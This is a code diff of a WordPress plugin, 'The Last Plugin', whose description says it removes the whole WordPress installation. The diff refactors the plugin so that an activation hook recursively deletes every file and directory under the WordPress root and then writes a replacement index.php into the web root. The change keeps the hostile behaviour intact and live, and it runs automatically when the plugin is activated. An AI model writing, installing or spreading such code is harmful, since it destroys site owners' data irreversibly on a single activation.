@@ -1,19 +1,13 @@
 <?php
 /*
-Plugin Name: The Last WP Plugin
+Plugin Name: The Last Plugin
 Description: A plugin to remove the entire WordPress installation and replace it with an optimized message.
 Version: 1.0
-Author: Doesn't Matter
+Author: Doesn't matter
+
 */
-
-register_activation_hook(__FILE__, 'remove_wordpress');
-
-function remove_wordpress() {
-    // Define the path to the WordPress root directory
-    $wp_root = ABSPATH;
-
     // Function to recursively delete directories and files
-    function delete_directory($dir) {
+    function last_plugin_delete_directory($dir) {
         if (!file_exists($dir)) {
             return;
         }
@@ -21,7 +15,7 @@ function remove_wordpress() {
         foreach ($files as $file) {
             $path = $dir . '/' . $file;
             if (is_dir($path)) {
-                delete_directory($path);
+                last_plugin_delete_directory($path);
             } else {
                 unlink($path);
             }
@@ -29,8 +23,12 @@ function remove_wordpress() {
         rmdir($dir);
     }
 
+register_activation_hook(__FILE__, function(){
+      // Define the path to the WordPress root directory
+    $wp_root = ABSPATH;
+
     // Delete the WordPress installation
-    delete_directory($wp_root);
+    last_plugin_delete_directory($wp_root);
 
     // Define the web root path
     $web_root = dirname($wp_root);
@@ -50,4 +48,4 @@ EOT;
 
     // Write the content to index.php
     file_put_contents($web_root . '/index.php', $index_content);
-}
+});
